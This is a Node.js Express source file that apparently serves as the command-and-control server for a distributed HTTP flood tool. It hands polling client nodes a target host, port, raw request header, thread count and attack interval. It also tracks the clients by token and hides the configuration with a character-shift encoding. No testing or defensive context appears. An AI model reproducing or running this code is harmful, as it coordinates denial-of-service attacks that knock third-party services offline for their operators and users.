const express = require('express');
const Clients = require('./clients');
const fs = require('fs');
const app = express();
const port = 3005;
const configFetchIntervalInMs = 10000;
const clients = new Clients({ inactiveTimeout: configFetchIntervalInMs * 2 });

app.get('/', (req, res) => {

  const newLine = '\r\n';
  const clientToken = req.get("x-client-token");
  const nodeConfig = JSON.parse(fs.readFileSync('./node.json'));

  const {
    host, port, path, method,
    contentLength, threadCount,
    callIntervalInMs, enabled, ssl
  } = nodeConfig;

  clients.add(clientToken);

  console.log(`x-client-token = ${req.get("x-client-token")}`);
  console.log('Client list:', Object.keys(clients.list));
  console.log('Client count:', clients.count);

  let body = `
headers=${method} ${path} HTTP/1.1${newLine}Host: ${host}${newLine}Accept: */*${newLine}Content-length: ${contentLength};
host=${host};
port=${port};
content_length=${contentLength};
thread_count=${threadCount};
call_interval_in_ms=${callIntervalInMs};
config_fetch_interval_in_ms=${configFetchIntervalInMs};
enabled=${enabled};
ssl=${ssl}${newLine}
  `;

  body = body
    .split('')
    .map((__, i) => String.fromCharCode(body.charCodeAt(i) + 13))
    .join('');

  console.log('Sending config...');
  res.set('Content-Type', 'text/plain');
  res.send(body);
});

app.post('/', (req, res) => {
  console.log('Receiving data with len: ', req.socket.bytesRead);
  res.send('Hello World!');
});

app.use(function (err, _, res, __) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
